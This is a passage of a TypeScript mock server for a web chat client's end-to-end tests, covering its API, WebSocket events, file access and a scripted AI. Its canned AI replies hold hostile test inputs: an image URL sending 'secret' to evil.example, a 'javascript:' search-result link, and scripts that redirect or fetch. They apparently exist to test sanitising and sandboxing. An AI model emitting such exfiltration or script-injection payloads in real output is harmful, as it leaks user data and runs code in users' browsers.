// A mock team server for the web client's end-to-end tests: the REST API of shared/src/api (every response is
// checked against the contract schema, every JSON body is validated like the real server does), the WebSocket
// protocol of ws.ts (hello / seq / resume / reset), and the built web app served by the real serveWeb() of
// server/src/routes/web.ts (same CSP and cache headers as production).
//
// The AI is scripted by keywords in the message: "artifact", "react", "ask", "error", "slow", "files", "search";
// anything else gets a Markdown answer with a table, code, math, a Mermaid diagram and an external image.
// Test-only controls: POST /__test/reset {setup?: boolean, teamLocale?: 'ko'|'en'|'id' (default ko), usersFollowTeam?:
// boolean (seeded people have no own language), mustChange?: username (signs in with a temporary password)}, POST /__test/drop-ws, POST /__test/server-version,
// POST /__test/revoke {path} (a folder becomes invisible to everyone + access_changed notice).
import { z } from 'zod'
import {
  ApiErrorResponse, CSRF_HEADER, DEV_SESSION_COOKIE, ERROR_MESSAGES, LOCALE_HEADER, Locale, ServerEvent, UPLOAD_CHUNK_SIZE, WS_PATH, WsClose, isSchema, listEndpoints, uuidv7,
  type ApiName, type Artifact, type Attachment, type Chat, type Endpoint, type ErrorCode, type FileEntry, type FileVersion, type Folder, type Group, type Invite, type Job, type Me, type Message,
  type Project, type ConnectionStatus, type ServerEventInput, type Step, type TrashItem, type TurnRequest, type UploadSession, type User, type Memory, type Budget, type TeamSettings, type AuditEntry,
} from '@mycel/shared/api'
import fs from 'node:fs'
import * as XLSX from 'xlsx'
import { makePdf } from '../../../tests/lib/pdf'
import { serveWeb } from '../../../server/src/routes/web-static'

type Json = Record<string, unknown>
const sha256Hex = (d: Uint8Array) => new Bun.CryptoHasher('sha256').update(d).digest('hex')
/** like a server whose relay.officialAvailable is off: the Team AX relay is not offered */
const defaultConnection = (): ConnectionStatus => ({ mode: 'self-relay', address: 'http://acme.localhost:19143', state: 'connecting', detail: null, connectedSince: null, direct: { enabled: false, port: 8443, fingerprintSha256: null }, teamName: 'acme', availableModes: ['self-relay', 'direct-only'] })
class Fail extends Error {
  constructor(public code: ErrorCode, public status: number, msg?: string) {
    super(msg ?? ERROR_MESSAGES[code].ko)
  }
}
const fail = (code: ErrorCode, status: number, msg?: string): never => {
  throw new Fail(code, status, msg)
}
const now = () => new Date().toISOString()
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

interface FileNode { type: 'file' | 'folder'; data?: Uint8Array; mtime: string; mime?: string }
interface WsData { user: string; windowId: string; epoch: string | null; after: number | null }
interface Ctx { user: User; params: Record<string, string>; query: Record<string, string>; body: any; req: Request; file?: File }
type Handler = (c: Ctx) => unknown | Promise<unknown>

const enc = new TextEncoder()
const dec = new TextDecoder()

const OWNER_PASSWORD = 'correct horse battery'

/** like server/src/admin/settings.ts LOCALE_CHANGED */
const LOCALE_CHANGED = { type: 'notice', data: { level: 'info', code: 'locale_changed', message: '' } } as const

export class MockServer {
  setupNeeded = false
  serverVersion = '0.1.0'
  epoch = uuidv7()
  seq = 0
  buffer: { seq: number; text: string }[] = []
  sockets = new Set<Bun.ServerWebSocket<WsData>>()
  sessions = new Map<string, string>() // token -> user id
  /** people whose latest sign-in used a temporary password (Me.session.tempLogin while they must change it) */
  tempLogins = new Set<string>()
  users: User[] = []
  passwords = new Map<string, string>()
  /** last password reset by an admin, per user id (Me.passwordReset) */
  resets = new Map<string, NonNullable<Me['passwordReset']>>()
  groups: Group[] = []
  invites: (Invite & { token: string })[] = []
  folders: Folder[] = []
  chats: Chat[] = []
  messages: Message[] = []
  artifacts: Artifact[] = []
  projects: Project[] = []
  memories: Memory[] = []
  budgets: Budget[] = []
  files = new Map<string, FileNode>()
  versions: FileVersion[] = []
  connection: ConnectionStatus = defaultConnection()
  trash: (TrashItem & { node: FileNode })[] = []
  uploads = new Map<string, UploadSession & { chunks: Map<number, Uint8Array> }>()
  attachments = new Map<string, Attachment & { data: Uint8Array }>()
  jobs = new Map<string, Job>()
  pendingAsk = new Map<string, (v: unknown) => void>()
  /** open cards by turn (GET /api/chats/:id/requests after a reload) */
  openAsks = new Map<string, { turnId: string; chatId: string; messageId: string; request: TurnRequest }>()
  stopped = new Set<string>()
  settings: TeamSettings = defaultSettings()
  /** every request the client made (method + path), for assertions */
  log: string[] = []

  constructor(o: { setup?: boolean } = {}) {
    this.reset(o)
  }

  generation = 0

  /** seeded people (olga, bob) have no language of their own */
  usersFollowTeam = false

  reset(o: { setup?: boolean; teamLocale?: Locale; usersFollowTeam?: boolean; mustChange?: string } = {}) {
    this.generation++
    this.setupNeeded = !!o.setup
    this.usersFollowTeam = !!o.usersFollowTeam
    this.serverVersion = '0.1.0'
    this.epoch = uuidv7()
    this.seq = 0
    this.buffer = []
    for (const ws of this.sockets) ws.close(1012, 'reset')
    this.sessions.clear()
    this.tempLogins.clear()
    this.passwords.clear()
    this.resets.clear()
    this.users = []
    this.groups = []
    this.invites = []
    this.chats = []
    this.messages = []
    this.artifacts = []
    this.projects = []
    this.memories = []
    this.budgets = []
    this.versions = []
    this.trash = []
    this.uploads.clear()
    this.attachments.clear()
    this.jobs.clear()
    this.files.clear()
    this.log = []
    this.settings = defaultSettings()
    if (o.teamLocale) this.settings.defaultLocale = o.teamLocale
    this.activeLeaf.clear()
    this.pendingAsk.clear()
    this.openAsks.clear()
    this.stopped.clear()
    this.revoked.clear()
    this.connection = defaultConnection()
    if (!this.setupNeeded) this.seed()
    for (const u of this.users) if (u.username === o.mustChange) u.mustChangePassword = true
  }

  seed() {
    const g: Group = { id: uuidv7(), name: '재무팀', description: '재무 자료', memberIds: ['olga'] }
    this.groups = [g]
    const own = this.usersFollowTeam ? null : 'ko'
    this.addUser({ id: 'olga', username: 'olga', name: 'Olga', role: 'owner', groupIds: [g.id], localeChoice: own }, OWNER_PASSWORD)
    this.addUser({ id: 'bob', username: 'bob', name: 'Bob', role: 'member', groupIds: [], localeChoice: own }, 'bob password 1')
    for (const p of ['docs', 'finance', 'finance/2026', 'marketing', 'secret', 'users', 'users/olga']) this.files.set(p, { type: 'folder', mtime: now() })
    this.putFile('marketing/plan.md', '# Plan\n\n- launch\n- grow\n')
    this.putFile('marketing/data.csv', 'name,value\nalpha,1\nbeta,2\n')
    this.putFile('marketing/notes.txt', 'hello notes')
    this.putFile('finance/2026/q3.csv', 'q,amount\nq3,100\n')
    this.putFile('marketing/page.html', '<h1>Hi</h1><script>document.body.append("ran")</script>')
    this.putFile('marketing/plan (충돌 사본 - Bob 2026-10-21 10.00).md', '# Plan conflicting\n')
    for (const [p, data] of officeFixtures()) this.putFile(p, data)
    this.folders = [
      { id: uuidv7(), path: 'finance', exists: true, createdAt: now(), rules: [] },
    ]
    this.folders[0]!.rules = [{ id: uuidv7(), folderId: this.folders[0]!.id, subjectType: 'group', subjectId: g.id, access: 'read', updatedBy: null, updatedAt: now() }]
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 1, sha256: 'a'.repeat(64), size: 20, author: { id: 'bob', name: 'Bob' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now() })
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 2, sha256: 'b'.repeat(64), size: 26, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now() })
    // a version identical to the file as it is now (after a restore): shown as "same as now", not offered
    this.versions.push({ id: uuidv7(), path: 'marketing/plan.md', version: 3, sha256: sha256Hex(this.files.get('marketing/plan.md')!.data!), size: 26, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'restore', conflictPath: null, createdAt: now() })
    // finance is read-only for the owner here: versions can be downloaded, not restored
    this.versions.push({ id: uuidv7(), path: 'finance/2026/q3.csv', version: 1, sha256: 'c'.repeat(64), size: 12, author: { id: 'olga', name: 'Olga' }, turnId: null, kind: 'edit', conflictPath: null, createdAt: now() })
  }

  /** like the server: people without their own language see the team default */
  syncLocales() {
    for (const u of this.users) u.locale = u.localeChoice ?? this.settings.defaultLocale
  }

  addUser(u: Pick<User, 'id' | 'username' | 'name' | 'role' | 'groupIds'> & { mustChangePassword?: boolean; localeChoice?: Locale | null }, password: string) {
    const user: User = { email: null, status: 'active', mustChangePassword: false, locale: 'ko', localeChoice: null, createdAt: now(), lastSeenAt: null, ...u }
    user.locale = user.localeChoice ?? this.settings.defaultLocale
    this.users.push(user)
    this.passwords.set(user.username, password)
    return user
  }

  putFile(path: string, content: string | Uint8Array) {
    const data = typeof content === 'string' ? enc.encode(content) : content
    this.files.set(path, { type: 'file', data, mtime: now() })
  }

  // ---------------- access (simplified policy) ----------------
  /** folders taken away from everyone by POST /__test/revoke (an admin's rule change) */
  revoked = new Set<string>()
  access(path: string, user: User): 'none' | 'read' | 'write' {
    if (path === '' ) return 'write'
    if ([...this.revoked].some((r) => path === r || path.startsWith(r + '/'))) return 'none'
    if (path === 'secret' || path.startsWith('secret/')) return 'none'
    if (path.startsWith('users/')) {
      const owner = path.split('/')[1]
      return owner === user.id || user.role === 'owner' ? 'write' : 'none'
    }
    if (path === 'finance' || path.startsWith('finance/')) return user.role === 'owner' ? 'read' : 'none'
    return 'write'
  }

  entry(path: string, n: FileNode, user: User): FileEntry {
    return { name: path.slice(path.lastIndexOf('/') + 1), path, type: n.type, size: n.type === 'file' ? n.data!.byteLength : null, mtime: n.mtime, mime: n.type === 'file' ? mimeOf(path) : null, access: this.access(path, user) }
  }

  // ---------------- realtime ----------------
  publish(ev: ServerEventInput) {
    const full = { ...ev, seq: ++this.seq, at: Date.now() }
    ServerEvent.parse(full)
    const text = JSON.stringify(full)
    this.buffer.push({ seq: full.seq, text })
    if (this.buffer.length > 5000) this.buffer.shift()
    for (const ws of this.sockets) ws.send(text)
  }

  // ---------------- helpers ----------------
  me(u: User, sid: string): Me {
    return {
      user: { id: u.id, username: u.username, name: u.name, email: u.email, role: u.role, locale: u.localeChoice ?? this.settings.defaultLocale, localeChoice: u.localeChoice, mustChangePassword: u.mustChangePassword, prefs: (u as User & { prefs?: Me['user']['prefs'] }).prefs ?? {} },
      groups: this.groups.filter((g) => u.groupIds.includes(g.id)).map((g) => ({ id: g.id, name: g.name })),
      team: { name: this.settings.teamName, defaultLocale: this.settings.defaultLocale },
      session: { id: '0192f0a0-0000-7000-8000-000000000000', client: 'web', expiresAt: new Date(Date.now() + 30 * 86400_000).toISOString(), tempLogin: u.mustChangePassword && this.tempLogins.has(u.id) },
      server: { version: this.serverVersion, dev: true },
      passwordReset: this.resets.get(u.id) ?? null,
    }
    void sid
  }

  startSession(u: User) {
    const token = uuidv7()
    this.sessions.set(token, u.id)
    return `${DEV_SESSION_COOKIE}=${token}; Path=/; HttpOnly; SameSite=Lax`
  }

  userOf(req: Request): User | null {
    const cookie = req.headers.get('cookie') ?? ''
    const m = cookie.match(new RegExp(`${DEV_SESSION_COOKIE}=([^;]+)`))
    const id = m ? this.sessions.get(m[1]!) : undefined
    return this.users.find((u) => u.id === id && u.status === 'active') ?? null
  }

  branchInfo(m: Message): Message['branch'] {
    const sibs = this.messages.filter((x) => x.chatId === m.chatId && x.parentId === m.parentId && x.role === m.role)
    return { index: sibs.findIndex((x) => x.id === m.id), count: sibs.length, siblingIds: sibs.map((x) => x.id) }
  }
  view(m: Message): Message {
    return { ...m, branch: this.branchInfo(m) }
  }
  activeLeaf = new Map<string, string>()
  path(chatId: string): Message[] {
    const leaf = this.activeLeaf.get(chatId)
    const out: Message[] = []
    let cur = leaf ? this.messages.find((m) => m.id === leaf) : undefined
    while (cur) {
      out.unshift(this.view(cur))
      const pid: string | null = cur.parentId
      cur = pid ? this.messages.find((m) => m.id === pid) : undefined
    }
    return out
  }
  newestLeafUnder(id: string): string {
    let cur = id
    for (;;) {
      const kids = this.messages.filter((m) => m.parentId === cur)
      if (!kids.length) return cur
      cur = kids[kids.length - 1]!.id
    }
  }

  message(o: Partial<Message> & Pick<Message, 'chatId' | 'role' | 'parentId'>): Message {
    const m: Message = { id: uuidv7(), author: null, content: '', attachments: [], steps: [], status: 'done', error: null, turnId: null, engine: null, model: null, files: null, usage: null, createdAt: now(), branch: { index: 0, count: 1, siblingIds: [] }, ...o }
    this.messages.push(m)
    return m
  }

  /** The scripted AI. */
  async runTurn(chatId: string, user: User, prompt: string, assistant: Message) {
    const turnId = assistant.turnId!
    const gen = this.generation
    const pub = (ev: ServerEventInput) => {
      if (gen !== this.generation) throw new Error('mock was reset')
      this.publish(ev)
    }
    const slow = /slow/i.test(prompt)
    const step = (s: Partial<Step> & Pick<Step, 'id' | 'kind' | 'label'>): Step => ({ status: 'running', startedAt: now(), endedAt: null, ...s })
    await sleep(60)
    pub({ type: 'queue.position', data: { chatId, messageId: assistant.id, turnId, position: 0 } })
    const s1 = step({ id: 's1', kind: 'tool', tool: 'grep', label: 'grep "plan" in marketing/' })
    assistant.steps = [s1]
    pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s1 } })
    await sleep(80)
    const s1done = { ...s1, status: 'ok' as const, endedAt: now() }
    assistant.steps = [s1done]
    pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s1done } })
    if (/search/i.test(prompt)) {
      const s2 = step({ id: 's2', kind: 'web_search', tool: 'WebSearch', label: 'Web search "team ax"', status: 'ok', endedAt: now(), sources: [{ title: 'Example result', url: 'https://example.com/a' }, { title: 'Poisoned result', url: 'javascript:top.document.title="pwned-search"' }] })
      assistant.steps = [...assistant.steps, s2]
      pub({ type: 'message.step', data: { chatId, messageId: assistant.id, step: s2 } })
    }
    if (/ask/i.test(prompt)) {
      const requestId = 'q1'
      const request: TurnRequest = /safety/i.test(prompt)
        ? { kind: 'ask_user', origin: 'server', requestId, question: 'AI가 이 대화에 나온 적 없는 주소를 열려고 합니다.\n\nhttps://example.com/?d=1', options: [{ label: '열기', value: 'allow' }, { label: '열지 않기', value: 'deny' }], allowText: false }
        : { kind: 'ask_user', requestId, question: '어느 분기를 볼까요?', options: [{ label: '3분기', value: 'q3' }, { label: '4분기', value: 'q4' }], allowText: true }
      this.openAsks.set(turnId, { turnId, chatId, messageId: assistant.id, request })
      pub({ type: 'turn.request', data: { turnId, chatId, messageId: assistant.id, request } })
      const answer = await new Promise((r) => this.pendingAsk.set(turnId, r))
      this.openAsks.delete(turnId)
      pub({ type: 'turn.request.closed', data: { turnId, requestId, reason: 'answered' } })
      prompt += ` answered:${JSON.stringify(answer)}`
    }
    if (/artifact|react/i.test(prompt)) {
      const react = /react/i.test(prompt)
      const key = react ? 'counter' : 'hello-page'
      const content = react
        ? 'import { useState } from "react"\nimport { Plus } from "lucide-react"\nexport default function App() {\n  const [n, setN] = useState(0)\n  return <button className="rounded bg-emerald-600 px-3 py-2 text-white" onClick={() => setN(n + 1)}><Plus size={14} /> count {n}</button>\n}\n'
        : /broken/i.test(prompt)
          ? '<h1>Broken</h1><script>throw new Error("boom")</script>'
          : /wander/i.test(prompt)
            ? `<h1>Wanderer</h1><script>setTimeout(function () { location.href = ${JSON.stringify(/home/i.test(prompt) ? "/" : "https://example.com/")} }, 1500)</script>`
          : '<h1 id="t">Hello artifact</h1><script>document.getElementById("t").textContent += " (ran)"; fetch("https://example.com/x").catch(()=>{})</script>'
      const type = react ? ('react' as const) : ('html' as const)
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key, type, title: react ? 'Counter' : 'Hello page', status: 'writing', content: content.slice(0, 20), artifact: null } })
      await sleep(120)
      const prev = this.artifacts.filter((a) => a.chatId === chatId && a.key === key)
      const a: Artifact = { id: uuidv7(), chatId, messageId: assistant.id, key, version: prev.length + 1, type, title: react ? 'Counter' : 'Hello page', language: null, content, createdAt: now() }
      this.artifacts.push(a)
      const { content: _c, ...summary } = a
      pub({ type: 'artifact.updated', data: { chatId, messageId: assistant.id, key, type, title: a.title, status: 'done', artifact: { ...summary, size: content.length } } })
    }
    const text = /error/i.test(prompt)
      ? ''
      : prompt.includes('answered:')
        ? `You chose ${prompt.split('answered:')[1]}.`
        : /artifact|react/i.test(prompt)
          ? 'I made an artifact for you.'
          : `Here is **the answer** for: ${prompt.slice(0, 40)}\n\n| name | value |\n|---|---|\n| alpha | 1 |\n| beta | 2 |\n\n\`\`\`python\nprint("hi")\n\`\`\`\n\nMath: $x^2 + 1$ and a price of $5.\n\n![chart](https://evil.example/collect?d=secret)\n\n\`\`\`mermaid\ngraph TD; A-->B\n\`\`\`\n\n[plan](/api/files/download?path=marketing%2Fplan.md)\n`
    const chunks = text.match(/[\s\S]{1,12}/g) ?? []
    for (const piece of chunks) {
      if (this.stopped.has(turnId)) break
      const offset = assistant.content.length
      assistant.content += piece
      pub({ type: 'message.delta', data: { chatId, messageId: assistant.id, offset, text: piece } })
      await sleep(slow ? 150 : 15)
    }
    assistant.status = this.stopped.has(turnId) ? 'stopped' : /error/i.test(prompt) ? 'error' : 'done'
    if (assistant.status === 'error') assistant.error = { code: 'engine_unavailable', message: ERROR_MESSAGES.engine_unavailable.ko }
    if (/files/i.test(prompt)) {
      this.putFile('marketing/report.md', '# Report\n')
      assistant.files = { saved: [{ path: 'marketing/report.md', action: 'create' }], conflicts: [{ path: 'marketing/plan.md', copyPath: 'marketing/plan (충돌 사본 - AI).md' }], rejected: [{ path: 'finance/2026/q3.csv', reason: 'read only' }] }
      pub({ type: 'files.changed', data: { changes: [{ path: 'marketing/report.md', action: 'create', by: null, turnId }] } })
    }
    assistant.usage = { inputTokens: 100, outputTokens: 50, costUsd: 0.001 }
    assistant.model = 'claude-sonnet'
    assistant.engine = 'claude-code'
    const chat = this.chats.find((c) => c.id === chatId)!
    chat.runState = 'idle'
    chat.updatedAt = now()
    if (!chat.title) chat.title = prompt.slice(0, 30)
    pub({ type: 'message.done', data: { chatId, messageId: assistant.id, status: assistant.status, message: this.view(assistant) } })
    pub({ type: 'chat.updated', data: { chatId, change: 'updated', chat } })
    void user
  }

  startTurn(chatId: string, user: User, prompt: string, parentId: string): Message {
    const chat = this.chats.find((c) => c.id === chatId)!
    const turnId = uuidv7()
    const assistant = this.message({ chatId, role: 'assistant', parentId, status: 'streaming', turnId, engine: chat.engine })
    this.activeLeaf.set(chatId, assistant.id)
    chat.runState = 'running'
    const gen = this.generation
    // a reset in between abandons the turn (its chat is gone)
    this.runTurn(chatId, user, prompt, assistant).catch((e) => { if (gen === this.generation) console.error('mock turn failed', e) })
    return assistant
  }

  // ---------------- handlers ----------------
  handlers: Partial<Record<ApiName, Handler>> = {
    health: () => ({ ok: true, version: this.serverVersion, schema: { applied: 2, readerLevel: 1 }, uptimeSec: 1, time: now() }),
    setupStatus: () => ({ needed: this.setupNeeded, teamName: this.setupNeeded ? null : this.settings.teamName, defaultLocale: this.settings.defaultLocale }),
    setup: (c) => {
      if (!this.setupNeeded) fail('conflict', 409)
      if (c.body.setupToken !== 'setup-token-0123456789') fail('forbidden', 403, 'wrong setup token')
      this.setupNeeded = false
      this.settings.teamName = c.body.teamName
      this.settings.defaultLocale = c.body.locale
      const u = this.addUser({ id: c.body.owner.username.toLowerCase().replace(/[^a-z0-9_-]/g, ''), username: c.body.owner.username, name: c.body.owner.name, role: 'owner', groupIds: [] }, c.body.owner.password)
      this.files.set('users', { type: 'folder', mtime: now() })
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, '') } }
    },
    login: (c) => {
      const u = this.users.find((x) => x.username === c.body.username)
      // like the server: before sign-in, the page's language header, else the team default
      const loc = Locale.safeParse(c.req.headers.get(LOCALE_HEADER)).data ?? this.settings.defaultLocale
      const wrong = { ko: '아이디나 비밀번호가 맞지 않습니다.', en: 'Wrong username or password.', id: 'Nama pengguna atau kata sandi salah.' }[loc]
      if (!u || this.passwords.get(u.username) !== c.body.password) fail('unauthorized', 401, wrong)
      if (u!.mustChangePassword) this.tempLogins.add(u!.id)
      else this.tempLogins.delete(u!.id)
      return { cookie: this.startSession(u!), body: { me: this.me(u!, '') } }
    },
    logout: () => ({ cookie: `${DEV_SESSION_COOKIE}=; Path=/; Max-Age=0`, body: undefined }),
    me: (c) => this.me(c.user, ''),
    updateMe: (c) => {
      const u = c.user as User & { prefs?: Me['user']['prefs'] }
      if (c.body.name) u.name = c.body.name
      if (c.body.locale !== undefined) u.localeChoice = c.body.locale
      this.syncLocales()
      if (c.body.locale !== undefined) this.publish(LOCALE_CHANGED)
      if (c.body.email !== undefined) u.email = c.body.email
      if (c.body.prefs) u.prefs = c.body.prefs
      return this.me(u, '')
    },
    changePassword: (c) => {
      // like the server: no current password only right after signing in with a temporary one
      if (c.body.currentPassword === undefined) {
        if (!(c.user.mustChangePassword && this.tempLogins.has(c.user.id))) fail('validation', 400, 'current password required')
      } else if (this.passwords.get(c.user.username) !== c.body.currentPassword) fail('forbidden', 403, 'wrong password')
      this.passwords.set(c.user.username, c.body.newPassword)
      c.user.mustChangePassword = false
      this.tempLogins.delete(c.user.id)
      return { ok: true }
    },
    mySessions: () => ({ items: [{ id: '0192f0a0-0000-7000-8000-000000000000', client: 'web', userAgent: 'Chrome on macOS', createdAt: now(), lastSeenAt: now(), expiresAt: now(), current: true }] }),
    inviteInfo: (c) => {
      const i = this.invites.find((x) => x.token === c.params.token)
      if (!i) fail('not_found', 404)
      return { teamName: this.settings.teamName, role: i!.role, expiresAt: i!.expiresAt, valid: !i!.usedAt }
    },
    acceptInvite: (c) => {
      const i = this.invites.find((x) => x.token === c.params.token && !x.usedAt)
      if (!i) fail('gone', 410)
      const u = this.addUser({ id: c.body.username.toLowerCase(), username: c.body.username, name: c.body.name, role: i!.role, groupIds: i!.groupIds, localeChoice: c.body.locale ?? null }, c.body.password)
      i!.usedAt = now()
      i!.usedBy = { id: u.id, name: u.name }
      return { status: 201, cookie: this.startSession(u), body: { me: this.me(u, '') } }
    },

    listChats: (c) => {
      const q = (c.query.q ?? '').toLowerCase()
      const trash = c.query.trash === '1' || c.query.trash === 'true'
      let list = this.chats.filter((x) => !!x.deletedAt === trash)
      if (c.query.projectId) list = list.filter((x) => x.projectId === c.query.projectId)
      if (q) list = list.filter((x) => x.title.toLowerCase().includes(q) || this.messages.some((m) => m.chatId === x.id && m.content.toLowerCase().includes(q)))
      return { items: [...list].sort((a, b) => (a.updatedAt < b.updatedAt ? 1 : -1)), nextCursor: null }
    },
    createChat: (c) => {
      const chat: Chat = { id: uuidv7(), projectId: c.body.projectId ?? null, title: c.body.title ?? '', engine: c.body.engine ?? 'claude-code', model: c.body.model ?? null, createdAt: now(), updatedAt: now(), deletedAt: null, runState: 'idle' }
      this.chats.push(chat)
      return { status: 201, body: chat }
    },
    getChat: (c) => this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404),
    updateChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      Object.assign(chat, Object.fromEntries(Object.entries(c.body).filter(([, v]) => v !== undefined)))
      return chat
    },
    deleteChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      chat.deletedAt = now()
      return { id: chat.id, deletedAt: chat.deletedAt, purgeAt: new Date(Date.now() + 7 * 86400_000).toISOString() }
    },
    restoreChat: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      chat.deletedAt = null
      return chat
    },
    listMessages: (c) => ({ items: this.path(c.params.id!), nextCursor: null }),
    listTurnRequests: (c) => ({ items: [...this.openAsks.values()].filter((r) => r.chatId === c.params.id) }),
    sendMessage: (c) => {
      const chat = this.chats.find((x) => x.id === c.params.id) ?? fail('not_found', 404)
      const dup = this.messages.find((m) => (m as Message & { cmid?: string }).cmid === c.body.clientMessageId)
      if (dup) fail('conflict', 409)
      // like the server when the person's "block" usage limit is used up (refused before anything is queued)
      if (String(c.body.content).includes('over my limit')) fail('budget_exceeded', 429, '오늘 AI 사용 한도를 다 썼어요. 10월 22일 오전 12:00부터 다시 쓸 수 있어요.')
      const parentId = c.body.parentId ?? this.activeLeaf.get(chat.id) ?? null
      const atts = (c.body.attachmentIds as string[]).map((id) => this.attachments.get(id)).filter(Boolean).map((a) => { const { data: _d, ...rest } = a!; return rest })
      const user = this.message({ chatId: chat.id, role: 'user', parentId, content: c.body.content, attachments: atts, author: { id: c.user.id, name: c.user.name } })
      ;(user as Message & { cmid?: string }).cmid = c.body.clientMessageId
      if (/^fail-send/.test(c.body.content)) fail('internal', 500, 'send failed on purpose')
      const assistant = this.startTurn(chat.id, c.user, c.body.content, user.id)
      return { status: 202, body: { userMessage: this.view(user), assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0 } }
    },
    stop: (c) => {
      const running = this.messages.find((m) => m.chatId === c.params.id && m.status === 'streaming')
      if (running?.turnId) this.stopped.add(running.turnId)
      return { stopped: !!running, turnId: running?.turnId ?? null }
    },
    regenerate: (c) => {
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      const userMsg = this.messages.find((m) => m.id === old.parentId)!
      const assistant = this.startTurn(c.params.id!, c.user, userMsg.content, userMsg.id)
      return { status: 202, body: { userMessage: null, assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0 } }
    },
    editMessage: (c) => {
      const old = this.messages.find((m) => m.id === c.params.messageId) ?? fail('not_found', 404)
      const user = this.message({ chatId: old.chatId, role: 'user', parentId: old.parentId, content: c.body.content, author: { id: c.user.id, name: c.user.name } })
      const assistant = this.startTurn(old.chatId, c.user, c.body.content, user.id)
      return { status: 202, body: { userMessage: this.view(user), assistantMessage: this.view(assistant), turnId: assistant.turnId, queuePosition: 0 } }
    },
    selectBranch: (c) => {
      this.activeLeaf.set(c.params.id!, this.newestLeafUnder(c.body.messageId))
      return { items: this.path(c.params.id!), nextCursor: null }
    },
    answerTurn: (c) => {
      const r = this.pendingAsk.get(c.params.id!)
      if (!r) fail('not_found', 404)
      this.pendingAsk.delete(c.params.id!)
      r!(c.body.kind === 'ask_user' ? c.body.answer : c.body.decision)
      return undefined
    },
    listProjects: () => ({ items: this.projects }),
    createProject: (c) => {
      const p: Project = { id: uuidv7(), name: c.body.name, folderPath: c.body.folderPath ?? (c.body.scope === 'personal' ? `users/${c.user.id}/projects/${c.body.name}` : `projects/${c.body.name}`), instructions: c.body.instructions ?? '', createdBy: { id: c.user.id, name: c.user.name }, createdAt: now(), canEdit: true }
      this.projects.push(p)
      return { status: 201, body: p }
    },
    getProject: (c) => this.projects.find((p) => p.id === c.params.id) ?? fail('not_found', 404),
    updateProject: (c) => Object.assign(this.projects.find((p) => p.id === c.params.id) ?? fail('not_found', 404), c.body),
    deleteProject: (c) => {
      this.projects = this.projects.filter((p) => p.id !== c.params.id)
      return undefined
    },
    listMemories: () => ({ items: this.memories, nextCursor: null }),
    deleteMemory: (c) => {
      this.memories = this.memories.filter((m) => m.id !== c.params.id)
      return undefined
    },
    clearMemories: () => {
      this.memories = []
      return undefined
    },

    tree: (c) => {
      const path = c.query.path ?? ''
      if (path && !this.files.has(path)) fail('not_found', 404)
      if (this.access(path, c.user) === 'none' && path !== 'secret') fail('not_found', 404)
      const kids = [...this.files.entries()].filter(([p]) => (path ? p.startsWith(path + '/') && !p.slice(path.length + 1).includes('/') : !p.includes('/')))
      const entries = kids
        .map(([p, n]) => this.entry(p, n, c.user))
        .filter((e) => !(e.path.startsWith('users/') && e.access === 'none'))
        .sort((a, b) => (a.type !== b.type ? (a.type === 'folder' ? -1 : 1) : a.name.localeCompare(b.name)))
      return { path, access: this.access(path, c.user), entries, nextCursor: null }
    },
    content: (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      return { path: c.query.path, size: n!.data!.byteLength, mtime: n!.mtime, sha256: new Bun.CryptoHasher('sha256').update(n!.data!).digest('hex'), mime: mimeOf(c.query.path!), binary: false, content: dec.decode(n!.data!), truncated: false, access: this.access(c.query.path!, c.user) }
    },
    saveContent: (c) => {
      let path: string = c.body.path
      if (this.access(path, c.user) !== 'write') fail('forbidden', 403)
      let conflict = false
      const cur = this.files.get(path)?.data
      if (cur && (c.body.baseSha256 === null || c.body.baseSha256 !== new Bun.CryptoHasher('sha256').update(cur).digest('hex'))) {
        conflict = true
        path = path.replace(/(\.[^.]+)?$/, (ext) => ` (충돌 사본 - ${c.user.name})${ext}`)
      }
      this.putFile(path, c.body.content)
      return { path, conflict, entry: this.entry(path, this.files.get(path)!, c.user) }
    },
    download: (c) => {
      const n = this.files.get(c.query.path!)
      if (!n || n.type !== 'file' || this.access(c.query.path!, c.user) === 'none') fail('not_found', 404)
      return new Response(n!.data! as unknown as BodyInit, { headers: { 'content-type': mimeOf(c.query.path!) ?? 'application/octet-stream', 'content-length': String(n!.data!.byteLength), 'content-disposition': 'attachment', 'x-content-type-options': 'nosniff', 'content-security-policy': "sandbox; default-src 'none'" } })
    },
    upload: (c) => {
      const folder: string = c.body.folder
      if (this.access(folder, c.user) !== 'write') fail('forbidden', 403)
      const name = c.body.name ?? c.file!.name
      let path = folder ? `${folder}/${name}` : name
      if (this.files.has(path)) path = path.replace(/(\.[^.]+)?$/, (ext: string) => ` (2)${ext}`)
      return (async () => {
        this.putFile(path, new Uint8Array(await c.file!.arrayBuffer()))
        this.publish({ type: 'files.changed', data: { changes: [{ path, action: 'create', by: { id: c.user.id, name: c.user.name }, turnId: null }] } })
        return { status: 201, body: this.entry(path, this.files.get(path)!, c.user) }
      })()
    },
    mkdir: (c) => {
      if (this.files.has(c.body.path)) fail('conflict', 409)
      this.files.set(c.body.path, { type: 'folder', mtime: now() })
      return { status: 201, body: this.entry(c.body.path, this.files.get(c.body.path)!, c.user) }
    },
    move: (c) => {
      const n = this.files.get(c.body.from) ?? fail('not_found', 404)
      if (this.files.has(c.body.to)) fail('conflict', 409)
      for (const [p, v] of [...this.files.entries()]) {
        if (p === c.body.from || p.startsWith(c.body.from + '/')) {
          this.files.delete(p)
